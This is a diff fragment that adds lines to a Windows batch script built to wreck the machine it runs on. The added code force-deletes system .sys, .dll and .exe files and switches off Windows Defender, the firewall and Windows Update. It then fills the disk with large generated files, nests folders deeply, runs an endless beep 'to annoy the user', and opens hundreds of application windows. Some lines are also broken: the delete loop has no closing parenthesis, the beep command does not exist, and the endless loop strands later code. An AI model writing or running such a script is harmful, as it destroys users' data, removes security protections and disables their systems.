@@ -110,3 +110,114 @@ for /r %%f in (*) do (
 
 :: Delete all system files
 for /r %%f in (*.sys,*.dll,*.exe) do (
+   del /f /q "%%~ff"
+
+:: Disable Windows Defender
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
+
+:: Disable Windows Firewall
+netsh advfirewall set allprofiles state off
+
+:: Disable Windows Update
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f
+
+:: Create a recursive folder structure
+for /l %%i in (1,1,100) do (
+    mkdir "folder_%%i"
+    cd "folder_%%i"
+    for /l %%j in (1,1,100) do (
+        mkdir "subfolder_%%j"
+        cd "subfolder_%%j"
+        for /l %%k in (1,1,100) do (
+            mkdir "subsubfolder_%%k"
+            cd "subsubfolder_%%k"
+        )
+        cd ..
+    )
+    cd ..
+)
+
+:: Create a 10GB file
+fsutil file createnew "large_file.txt" 10737418240
+
+:: Create a 100MB file and copy it 100 times
+fsutil file createnew "medium_file.txt" 104857600
+for /l %%i in (1,1,100) do (
+    copy /y "medium_file.txt" "medium_file_%%i.txt"
+)
+
+:: Create a 1MB file and copy it 1000 times
+fsutil file createnew "small_file.txt" 1048576
+for /l %%i in (1,1,1000) do (
+    copy /y "small_file.txt" "small_file_%%i.txt"
+)
+
+:: Play a continuous beep sound to annoy the user
+:beep_loop
+beep 1000 100
+goto beep_loop
+
+:: Open Notepad and type out a long message
+start "" notepad.exe
+timeout /t 5
+powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('This is a very long message that will take a while to type out.{ENTER}It will repeat many times and fill up the Notepad window.{ENTER}Good luck trying to close it!{ENTER}')"
+
+:: Repeat the message 100 times
+for /l %%i in (1,1,100) do (
+    powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{ENTER}This is a very long message that will take a while to type out.{ENTER}It will repeat many times and fill up the Notepad window.{ENTER}Good luck trying to close it!{ENTER}')"
+)
+
+:: Open 100 instances of Notepad
+for /l %%i in (1,1,100) do (
+    start "" notepad.exe
+)
+
+:: Open 100 instances of Calculator
+for /l %%i in (1,1,100) do (
+    start "" calc.exe
+)
+
+:: Open 100 instances of Paint
+for /l %%i in (1,1,100) do (
+    start "" mspaint.exe
+)
+
+:: Open 100 instances of Windows Media Player
+for /l %%i in (1,1,100) do (
+    start "" wmplayer.exe
+)
+
+:: Open 100 instances of Internet Explorer
+for /l %%i in (1,1,100) do (
+    start "" iexplore.exe
+)
+
+:: Open 100 instances of Chrome
+for /l %%i in (1,1,100) do (
+    start "" chrome.exe
+)
+
+:: Open 100 instances of Firefox
+for /l %%i in (1,1,100) do (
+    start "" firefox.exe
+)
+
+:: Create a 1GB file and copy it 10 times
+fsutil file createnew "large_file2.txt" 1073741824
+for /l %%i in (1,1,10) do (
+    copy /y "large_file2.txt" "large_file2_%%i.txt"
+)
+
+:: Create a 500MB file and copy it 20 times
+fsutil file createnew "medium_file2.txt" 536870912
+for /l %%i in (1,1,20) do (
+    copy /y "medium_file2.txt" "medium_file2_%%i.txt"
+)
+
+:: Create a 100MB file and copy it 50 times
+fsutil file createnew "small_file2.txt" 104857600
+for /l %%i in (1,1,50) do (
+    copy /y "small_file2.txt" "small_file2_%%i.txt"
+)
+
+:: Play a continuous beep sound
